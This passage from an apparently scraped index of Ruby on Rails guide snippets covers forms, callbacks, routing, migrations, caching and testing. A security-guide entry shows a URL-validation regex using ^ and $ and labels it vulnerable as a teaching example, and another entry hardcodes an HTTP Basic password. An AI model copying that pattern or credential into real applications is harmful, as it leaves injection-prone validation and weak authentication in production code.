allowing users to select their preferred timezone.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_47\n\nLANGUAGE: html\nCODE:\n```\n<select name=\"time_zone\" id=\"time_zone\">\n  <option value=\"International Date Line West\">(GMT-12:00) International Date Line West</option>\n  <option value=\"American Samoa\">(GMT-11:00) American Samoa</option>\n  <option value=\"Midway Island\">(GMT-11:00) Midway Island</option>\n  <option value=\"Hawaii\">(GMT-10:00) Hawaii</option>\n  <option value=\"Alaska\">(GMT-09:00) Alaska</option>\n  ...\n  <option value=\"Samoa\">(GMT+13:00) Samoa</option>\n  <option value=\"Tokelau Is.\">(GMT+13:00) Tokelau Is.</option>\n</select>\n```\n\n----------------------------------------\n\nTITLE: Using Processor-Specific Options with Active Storage Variants\nDESCRIPTION: Shows how to pass processor-specific options to image transformations by including them as key-value pairs in a hash. In this example, the crop option is set to 'centre' for the Vips processor.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_57\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag user.avatar.variant(resize_to_fill: [100, 100, { crop: :centre }]) %>\n```\n\n----------------------------------------\n\nTITLE: Defining a Custom Serializer for Active Job Arguments (Ruby)\nDESCRIPTION: This snippet illustrates how to define a custom serializer for handling unsupported argument types in Active Job, using `Money` as an example. The `MoneySerializer` converts the `Money` object into a hash for serialization and reconstructs the object during deserialization.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\n# app/serializers/money_serializer.rb\nclass MoneySerializer < ActiveJob::Serializers::ObjectSerializer\n  # Converts an object to a simpler representative using supported object types.\n  # The recommended representative is a Hash with a specific key. Keys can be of basic types only.\n  # You should call `super` to add the custom serializer type to the hash.\n  def serialize(money)\n    super(\n      \"amount\" => money.amount,\n      \"currency\" => money.currency\n    )\n  end\n\n  # Converts serialized value into a proper object.\n  def deserialize(hash)\n    Money.new(hash[\"amount\"], hash[\"currency\"])\n  end\n\n  private\n    # Checks if an argument should be serialized by this serializer.\n    def klass\n      Money\n    end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/custom_serializers.rb\nRails.application.config.active_job.custom_serializers << MoneySerializer\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\nmodule YourApp\n  class Application < Rails::Application\n    config.autoload_once_paths << \"#{root}/app/serializers\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Humanizing Strings\nDESCRIPTION: Illustrates the `humanize` method, which converts an attribute name into a human-readable form, making it suitable for displaying to end-users. It performs multiple transformations including inflection, underscore handling, and capitalization.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_84\n\nLANGUAGE: ruby\nCODE:\n```\n\"name\".humanize                         # => \"Name\"\n\"author_id\".humanize                    # => \"Author\"\n\"author_id\".humanize(capitalize: false) # => \"author\"\n\"comments_count\".humanize               # => \"Comments count\"\n\"_id\".humanize                          # => \"Id\"\n```\n\n----------------------------------------\n\nTITLE: Setting HTTP Location Header in Rails\nDESCRIPTION: This snippet shows how to set the HTTP `Location` header when rendering content in Rails. The `:location` option is used to specify the URL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nrender xml: photo, location: photo_url(photo)\n```\n\n----------------------------------------\n\nTITLE: Conditional Fragment Caching with ERB\nDESCRIPTION: Caches a fragment of view logic only if a condition is met (e.g., if the user is an admin). Uses `cache_if` to conditionally cache the product.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_1\n\nLANGUAGE: erb\nCODE:\n```\n<% cache_if admin?, product do %>\n  <%= render product %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Enhanced Session Expiry with Creation Time Constraint\nDESCRIPTION: An improved session expiry method that also considers when the session was created. This prevents attackers from maintaining sessions indefinitely by periodically refreshing them.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nwhere(updated_at: ...time.ago).or(where(created_at: ...2.days.ago)).delete_all\n```\n\n----------------------------------------\n\nTITLE: Find Customer by Composite ID\nDESCRIPTION: Finds a customer using a composite primary key.  The primary key is an array of columns (in this case, store_id and id).  An array containing the values for each key is passed to find.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\n# Find the customer with store_id 3 and id 17\nirb> customers = Customer.find([3, 17])\n=> #<Customer store_id: 3, id: 17, first_name: \"Magda\">\n```\n\n----------------------------------------\n\nTITLE: Rails Configuration Loading from YAML\nDESCRIPTION: Shows how to use Rails::Application.config_for to load environment-specific configuration from YAML files.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_2_release_notes.md#2025-04-23_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\n# config/exception_notification.yml\nproduction:\n  url: http://127.0.0.1:8080\n  namespace: my_app_production\ndevelopment:\n  url: http://localhost:3001\n  namespace: my_app_development\n```\n\n----------------------------------------\n\nTITLE: Migrate to specific version\nDESCRIPTION: Shows how to migrate the database to a specific version using the `db:migrate` command with the `VERSION` parameter. The version number corresponds to the timestamp in the migration filename.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_63\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate VERSION=20240428000000\n```\n\n----------------------------------------\n\nTITLE: Configuring Engine Overrides in Rails Application\nDESCRIPTION: Configuration setup for organizing engine overrides in a dedicated directory and preloading them using a to_prepare callback.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_55\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\nmodule MyApp\n  class Application < Rails::Application\n    # ...\n\n    overrides = \"#{Rails.root}/app/overrides\"\n    Rails.autoloaders.main.ignore(overrides)\n\n    config.to_prepare do\n      Dir.glob(\"#{overrides}/**/*_override.rb\").sort.each do |override|\n        load override\n      end\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Dependent Association with after_destroy Callback in Rails\nDESCRIPTION: This code demonstrates how to define a has_many association with the `dependent: :destroy` option and an `after_destroy` callback in Rails.  When a User record is destroyed, all associated Article records will also be destroyed, triggering the `log_destroy_action` callback for each destroyed article. This ensures associated data is cleaned up and logging occurs upon record deletion.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  has_many :articles, dependent: :destroy\nend\n\nclass Article < ApplicationRecord\n  after_destroy :log_destroy_action\n\n  def log_destroy_action\n    Rails.logger.info(\"Article destroyed\")\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: English Locale File with Products Index Title - YAML\nDESCRIPTION: This YAML snippet shows an example of an English locale file (en.yml) with a translation for the \"products.index.title\" key, which is used in the products index view.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_92\n\nLANGUAGE: yaml\nCODE:\n```\nen:\n  hello: \"Hello world\"\n  products:\n    index:\n      title: \"Products\"\n```\n\n----------------------------------------\n\nTITLE: Multiple Conditions for before_save Callback in Rails\nDESCRIPTION: Demonstrates how to specify multiple conditions for a `before_save` callback using an array of symbols. The `filter_content` method is executed only if both `subject_to_parental_control?` and `untrusted_author?` methods return true.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\nclass Comment < ApplicationRecord\n  before_save :filter_content,\n    if: [:subject_to_parental_control?, :untrusted_author?]\nend\n```\n\n----------------------------------------\n\nTITLE: Enabling Per-form CSRF Tokens in Rails 5\nDESCRIPTION: Configuration to enable per-form CSRF tokens, a new security feature in Rails 5 that mitigates code-injection attacks by providing unique tokens for each form based on its action and method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_55\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_controller.per_form_csrf_tokens = true\n```\n\n----------------------------------------\n\nTITLE: HTTP Basic Authentication in Rails Controller\nDESCRIPTION: Implementation of HTTP Basic Authentication in a Rails controller using http_basic_authenticate_with method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nclass AdminsController < ApplicationController\n  http_basic_authenticate_with name: \"Arthur\", password: \"42424242\"\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Payload for sql.active_record in Ruby\nDESCRIPTION: This example payload is for the `sql.active_record` event, detailing a database query execution. The Ruby hash includes keys like `:sql` (the statement), `:name` (operation name), `:binds`, `:type_casted_binds`, `:async` flag, `:allow_retry` flag, `:connection` object, `:transaction` object (or nil), `:affected_rows`, `:row_count`, `:cached` flag (if applicable), and `:statement_name` (Postgres only). Database adapters might add more keys.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  sql: \"SELECT \\\"posts\\\".* FROM \\\"posts\\\" \",\n  name: \"Post Load\",\n  binds: [<ActiveModel::Attribute::WithCastValue:0x00007fe19d15dc00>],\n  type_casted_binds: [11],\n  async: false,\n  allow_retry: true,\n  connection: <ActiveRecord::ConnectionAdapters::SQLite3Adapter:0x00007f9f7a838850>,\n  transaction: <ActiveRecord::ConnectionAdapters::RealTransaction:0x0000000121b5d3e0>\n  affected_rows: 0\n  row_count: 5,\n  statement_name: nil,\n}\n```\n\n----------------------------------------\n\nTITLE: Simplified Lambda Validation in Ruby\nDESCRIPTION: Demonstrates the simplified syntax for using lambdas in validators without requiring a record argument.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\n# Before\nvalidates_comparison_of :birth_date, less_than_or_equal_to: ->(_record) { Date.today }\n\n# After\nvalidates_comparison_of :birth_date, less_than_or_equal_to: -> { Date.today }\n```\n\n----------------------------------------\n\nTITLE: JSON Encoding Example with Custom Class\nDESCRIPTION: Demonstration of JSON encoding behavior differences between Rails JSON encoder and the JSON gem\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_77\n\nLANGUAGE: ruby\nCODE:\n```\nclass FooBar\n  def as_json(options = nil)\n    { foo: \"bar\" }\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nirb> FooBar.new.to_json\n=> \"{\\\"foo\\\":\\\"bar\\\"}\"\nirb> JSON.generate(FooBar.new)\n=> \"\\\"#<FooBar:0x007fa80a481610>\\\"\"\n```\n\n----------------------------------------\n\nTITLE: Defining Article-Comment Association (Ruby)\nDESCRIPTION: Adds the `has_many :comments` association to the `Blorgh::Article` model (`app/models/blorgh/article.rb`). This establishes the one-to-many relationship between articles and comments within the engine's namespace.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nhas_many :comments\n```\n\n----------------------------------------\n\nTITLE: HTML Safe Translations\nDESCRIPTION: Demonstrates how to handle HTML-safe translations in YAML configuration and views\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_37\n\nLANGUAGE: yaml\nCODE:\n```\nen:\n  welcome: <b>welcome!</b>\n  hello_html: <b>hello!</b>\n  title:\n    html: <b>title!</b>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<div><%= t('welcome') %></div>\n<div><%= raw t('welcome') %></div>\n<div><%= t('hello_html') %></div>\n<div><%= t('title.html') %></div>\n```\n\n----------------------------------------\n\nTITLE: Simplified set_author Method\nDESCRIPTION: Ruby code showing the simplified set_author method after overriding the author_class getter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_50\n\nLANGUAGE: ruby\nCODE:\n```\nself.author = Blorgh.author_class.find_or_create_by(name: author_name)\n```\n\n----------------------------------------\n\nTITLE: Running Rails Initializers\nDESCRIPTION: The #run_initializers method from Rails::Initializable that runs all initializers for a given group. It sorts initializers topologically and runs them in order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\ndef run_initializers(group = :default, *args)\n  return if instance_variable_defined?(:@ran)\n  initializers.tsort_each do |initializer|\n    initializer.run(*args) if initializer.belongs_to?(group)\n  end\n  @ran = true\nend\n```\n\n----------------------------------------\n\nTITLE: Exclusion Validation with Beginless Ranges in Ruby\nDESCRIPTION: Shows how to use beginless ranges with exclusion validators using a lambda that returns a date range.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nvalidates_exclusion_of :birth_date, in: -> { (..Date.today) }\n```\n\n----------------------------------------\n\nTITLE: Action Cable Subscription Callback in Ruby\nDESCRIPTION: This code shows the `subscribed` callback method within a channel. This method is called when a consumer successfully subscribes to the channel. It is a place to put logic that executes immediately after subscription.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_6\n\nLANGUAGE: Ruby\nCODE:\n```\n# app/channels/chat_channel.rb\nclass ChatChannel < ApplicationCable::Channel\n  # Called when the consumer has successfully\n  # become a subscriber to this channel.\n  def subscribed\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Singular Resource Routing\nDESCRIPTION: This snippet demonstrates the use of resource and resolve for singular resource routing. Singular resources requires routes declared with resource :article.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nresource :article\nresolve(\"Article\") { [:article] }\n```\n\n----------------------------------------\n\nTITLE: Building the Rack Application\nDESCRIPTION: The Rackup::Server#app method that determines how to build the Rack application, either from a string or from a configuration file (typically config.ru).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Rackup\n  class Server\n    def app\n      @app ||= options[:builder] ? build_app_from_string : build_app_and_options_from_config\n    end\n\n    # ...\n\n    private\n      def build_app_and_options_from_config\n        if !::File.exist? options[:config]\n          abort \"configuration #{options[:config]} not found\"\n        end\n\n        Rack::Builder.parse_file(self.options[:config])\n      end\n\n      def build_app_from_string\n        Rack::Builder.new_from_string(self.options[:builder])\n      end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering a Partial from Another Folder\nDESCRIPTION: This code snippet demonstrates rendering a partial located in another folder.  It renders `app/views/application/_menu.html.erb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_70\n\nLANGUAGE: html\nCODE:\n```\n<%= render \"application/menu\" %>\n```\n\n----------------------------------------\n\nTITLE: Iterating Through Selected Elements with Assert Dom\nDESCRIPTION: This code demonstrates how to iterate through a collection of selected HTML elements and use `assert_dom` to verify properties of each element.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_81\n\nLANGUAGE: ruby\nCODE:\n```\nassert_dom \"ol\" do |elements|\n  elements.each do |element|\n    assert_dom element, \"li\", 4\n  end\nend\n\nassert_dom \"ol\" do\n  assert_dom \"li\", 8\nend\n```\n\n----------------------------------------\n\nTITLE: Add Redis gem to Gemfile\nDESCRIPTION: This snippet demonstrates how to add the Redis gem to your Gemfile, which is a necessary dependency for using the RedisCacheStore in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"redis\"\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Regular Expression Pattern for URL Validation\nDESCRIPTION: An example of an insecure regular expression that incorrectly uses ^ and $ for string boundaries in Ruby. This pattern is vulnerable because it only matches line beginnings and endings rather than the entire string.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\n/^https?:\\/\\/[^\\n]+$/i\n```\n\n----------------------------------------\n\nTITLE: Sanitizing CSS Styles with sanitize_css Helper in Ruby\nDESCRIPTION: Shows the `sanitize_css` helper from Action View's SanitizeHelper. It removes disallowed CSS styles from a given string, useful for sanitizing style attributes in user-generated content.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nsanitize_css(\"background-color: red; color: white; font-size: 16px;\")\n```\n\n----------------------------------------\n\nTITLE: Disabling Encryption Within a Code Block - Ruby\nDESCRIPTION: Disables encryption for all database operations performed inside the block, causing data to be stored and read as plaintext (or ciphertext directly). Useful for debugging or special operations. Requires no arguments except the block. Use with caution; sensitive data may be exposed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nActiveRecord::Encryption.without_encryption do\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Constantizing Strings from Mailer Test Cases\nDESCRIPTION: Demonstrates how Mailer test cases utilize the `constantize` method to dynamically determine the mailer class being tested based on the test class name, effectively inferring the associated mailer.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_83\n\nLANGUAGE: ruby\nCODE:\n```\ndef determine_default_mailer(name)\n  name.delete_suffix(\"Test\").constantize\nrescue NameError => e\n  raise NonInferrableMailerError.new(name)\nend\n```\n\n----------------------------------------\n\nTITLE: Asserting Route Recognition with HTTP Method (Ruby)\nDESCRIPTION: Asserts that a given path and HTTP method are recognized and route to a specified controller and action.  It uses a `:method` argument within the second parameter to specify the HTTP verb.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_89\n\nLANGUAGE: ruby\nCODE:\n```\nassert_recognizes({ controller: \"photos\", action: \"create\" }, { path: \"photos\", method: :post })\n```\n\n----------------------------------------\n\nTITLE: Indent String with Custom Indent String\nDESCRIPTION: This snippet demonstrates indenting lines in a string using a custom indent string (e.g., tabs).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_56\n\nLANGUAGE: ruby\nCODE:\n```\n\"  foo\".indent(2)        # => \"    foo\"\n\"foo\\n\\t\\tbar\".indent(2) # => \"\\t\\tfoo\\n\\t\\t\\t\\tbar\"\n\"foo\".indent(2, \"\\t\")    # => \"\\t\\tfoo\"\n```\n\n----------------------------------------\n\nTITLE: Rails Generator Command\nDESCRIPTION: Command to access Rails generators within the engine context\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model\n```\n\n----------------------------------------\n\nTITLE: Controlling Association Caching in Rails\nDESCRIPTION: Demonstrates how Rails association caching works, including how to load associations, use cached copies, and reload data when needed. This example shows efficient ways to manage association data loading and caching behavior.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_91\n\nLANGUAGE: ruby\nCODE:\n```\n# retrieves books from the database\nauthor.books.load\n\n# uses the cached copy of books\nauthor.books.size\n\n# uses the cached copy of books\nauthor.books.empty?\n```\n\n----------------------------------------\n\nTITLE: Adding Column with Comments (Ruby)\nDESCRIPTION: This code demonstrates how to add comments to columns in a migration using the `:comment` option. This example adds comments describing the purpose of the `price` and `stock_quantity` columns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_36\n\nLANGUAGE: Ruby\nCODE:\n```\nclass AddDetailsToProducts < ActiveRecord::Migration[8.1]\n  def change\n    add_column :products, :price, :decimal, precision: 8, scale: 2, comment: \"The price of the product in USD\"\n    add_column :products, :stock_quantity, :integer, comment: \"The current stock quantity of the product\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining an after_touch callback in Rails\nDESCRIPTION: Defines an `after_touch` callback in a Rails Active Record model.  This callback will be executed whenever an instance of the `User` model is touched, logging a message to the Rails logger. The `after_touch` block receives the user object as an argument.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  after_touch do |user|\n    Rails.logger.info(\"You have touched an object\")\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Receiving JSON Parameters\nDESCRIPTION: Illustrates how Rails automatically parses JSON parameters from a request with the `content-type` header set to `application/json` and makes them available in the `params` hash.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\n{ \"user\" => { \"name\" => \"acme\", \"address\" => \"123 Carrot Street\" } }\n```\n\n----------------------------------------\n\nTITLE: Postfix Ingress command line setup\nDESCRIPTION: This command pipes inbound emails to the Action Mailbox Postfix ingress, providing the URL of the relay ingress and the ingress password.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_9\n\nLANGUAGE: Bash\nCODE:\n```\n$ bin/rails action_mailbox:ingress:postfix URL=https://example.com/rails/action_mailbox/relay/inbound_emails INGRESS_PASSWORD=...\n```\n\n----------------------------------------\n\nTITLE: Invoking Rails Commands or Rake Tasks in rails/command.rb (Ruby)\nDESCRIPTION: The `invoke` class method in `Rails::Command` acts as the central dispatcher for Rails commands. It takes a command namespace (potentially including a command name) and arguments, finds the registered command class, and calls its `perform` method. If a specific Rails command isn't found, it attempts to invoke a Rake task with the same name. It includes error handling for unrecognized commands and logic to display help.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Rails\n  module Command\n    class << self\n      def invoke(full_namespace, args = [], **config)\n        args = [\"--help\"] if rails_new_with_no_path?(args)\n\n        full_namespace = full_namespace.to_s\n        namespace, command_name = split_namespace(full_namespace)\n        command = find_by_namespace(namespace, command_name)\n\n        with_argv(args) do\n          if command && command.all_commands[command_name]\n            command.perform(command_name, args, config)\n          else\n            invoke_rake(full_namespace, args, config)\n          end\n        end\n      rescue UnrecognizedCommandError => error\n        if error.name == full_namespace && command && command_name == full_namespace\n          command.perform(\"help\", [], config)\n        else\n          puts error.detailed_message\n        end\n        exit(1)\n      end\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Paths with url_for and Magazine/Ad Objects - Ruby/ERB\nDESCRIPTION: This snippet shows how to use `url_for` with an array of `Magazine` and `Ad` objects to generate a path. Rails will recognize the object types and use the appropriate route helper. The generated path will be something like `/magazines/5/ads/42`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_22\n\nLANGUAGE: erb\nCODE:\n```\n<%= link_to 'Ad details', url_for([@magazine, @ad]) %>\n```\n\n----------------------------------------\n\nTITLE: Including a Helper Directly in a Parent Class\nDESCRIPTION: This code shows how to require a helper module and include it directly into the relevant parent class, making the helper available to all tests inheriting from that class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_77\n\nLANGUAGE: ruby\nCODE:\n```\n# test/test_helper.rb\nrequire \"test_helpers/sign_in_helper\"\n\nclass ActionDispatch::IntegrationTest\n  include SignInHelper\nend\n```\n\n----------------------------------------\n\nTITLE: Setting the Session Store in Rails\nDESCRIPTION: This code snippet shows how to set the session store in Rails using `session_store=`. It accepts either a symbol representing a session store class or the actual class itself. If a symbol is passed, it's converted to the corresponding class name using `camelize` and retrieved using `ActionDispatch::Session.const_get`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_68\n\nLANGUAGE: ruby\nCODE:\n```\ndef session_store=(store)\n  @@session_store = store.is_a?(Symbol) ?\n    ActionDispatch::Session.const_get(store.to_s.camelize) :\n    store\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Paths for Edit Action - Ruby/ERB\nDESCRIPTION: This snippet creates a link to the edit action by inserting the `:edit` symbol as the first element of the array passed to `link_to`. This is used to generate paths for actions other than the default show action.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_25\n\nLANGUAGE: erb\nCODE:\n```\n<%= link_to 'Edit Ad', [:edit, @magazine, @ad] %>\n```\n\n----------------------------------------\n\nTITLE: Validation Error Output for Account Creation - IRB\nDESCRIPTION: Displays the error output in IRB when Account creation fails validation, raising ActiveRecord::RecordInvalid with attribute-specific information. Useful for testing validation scenarios.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_33\n\nLANGUAGE: irb\nCODE:\n```\nirb> raise_validation_error: Validation failed: Terms can't be blank (ActiveRecord::RecordInvalid)\n```\n\n----------------------------------------\n\nTITLE: Creating Basic Active Record Model in Ruby\nDESCRIPTION: Demonstrates how to create a basic Active Record model by inheriting from ApplicationRecord. This creates a Book model that maps to a books table in the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\nend\n```\n\n----------------------------------------\n\nTITLE: Compiled Partial Methods with Locals\nDESCRIPTION: Illustrates the Ruby methods that are compiled from the partials in the previous example, showing how local variables are incorporated into the method signatures. It shows the creation of two separate methods due to different local variable combinations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\ndef _render_template_2323231_article_show(buffer, local_assigns, article:)\n  # ...\nend\n\ndef _render_template_3243454_article_show(buffer, local_assigns, article:, theme:)\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Migration with Modifiers (Shell)\nDESCRIPTION: This command generates a migration to add `price` (decimal with precision and scale) and `supplier` (polymorphic reference) columns to the `products` table, demonstrating how to use modifiers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_22\n\nLANGUAGE: Shell\nCODE:\n```\n$ bin/rails generate migration AddDetailsToProducts 'price:decimal{5,2}' supplier:references{polymorphic}\n```\n\n----------------------------------------\n\nTITLE: Engine Resource Route Configuration\nDESCRIPTION: Route configuration for articles resource within the Blorgh engine namespace\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nBlorgh::Engine.routes.draw do\n  resources :articles\nend\n```\n\n----------------------------------------\n\nTITLE: Resourceful Route with Named Route Helpers Override in Rails\nDESCRIPTION: This code snippet shows how to override the default names for the route helpers using the `:as` option. In this example, the route helpers for `/photos` will be named `images_path` instead of `photos_path`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_66\n\nLANGUAGE: ruby\nCODE:\n```\nresources :photos, as: \"images\"\n```\n\n----------------------------------------\n\nTITLE: Running All Rails Tests in Bash\nDESCRIPTION: This command navigates into the main Rails project directory and executes the default Rake task `test`, which runs the entire test suite for all components of the Rails framework. Requires `bundle` to be installed and dependencies managed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\n$ cd rails\n$ bundle exec rake test\n```\n\n----------------------------------------\n\nTITLE: Karaoke Lyrics Streaming Example in Rails\nDESCRIPTION: Shows a practical example of live streaming using ActionController::Live to create a karaoke-style lyrics display system. Demonstrates streaming lines with timing control.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nclass LyricsController < ActionController::Base\n  include ActionController::Live\n\n  def show\n    response.headers[\"Content-Type\"] = \"text/event-stream\"\n    response.headers[\"Cache-Control\"] = \"no-cache\"\n\n    song = Song.find(params[:id])\n\n    song.each do |line|\n      response.stream.write line.lyrics\n      sleep line.num_beats\n    end\n  ensure\n    response.stream.close\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Applying Rails Template to Existing Application\nDESCRIPTION: Command to apply a template to an existing Rails application using the app:template rake task. The LOCATION parameter specifies the path to the template file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_27\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails app:template LOCATION=path/to/template.rb\n```\n\n----------------------------------------\n\nTITLE: Updating Bundler - Bash\nDESCRIPTION: Shows the shell command to update the Bundler gem, necessary when an older version is present. It assumes RubyGems and Bundler are installed; running it refreshes Bundler to the latest version.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n$ gem update bundler\n```\n\n----------------------------------------\n\nTITLE: Formatting Currency with number_to_currency in Ruby\nDESCRIPTION: Shows how to use the number_to_currency helper to format a number into a currency string.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nnumber_to_currency(1234567890.50) # => $1,234,567,890.50\n```\n\n----------------------------------------\n\nTITLE: Setting Line Number Breakpoints in Rails Debugger\nDESCRIPTION: Using the `break` (or `b`) command to set a breakpoint on a specific line number. This example shows setting a breakpoint on line 28 and the debugger stopping execution when that line is reached.\nSOURCE: 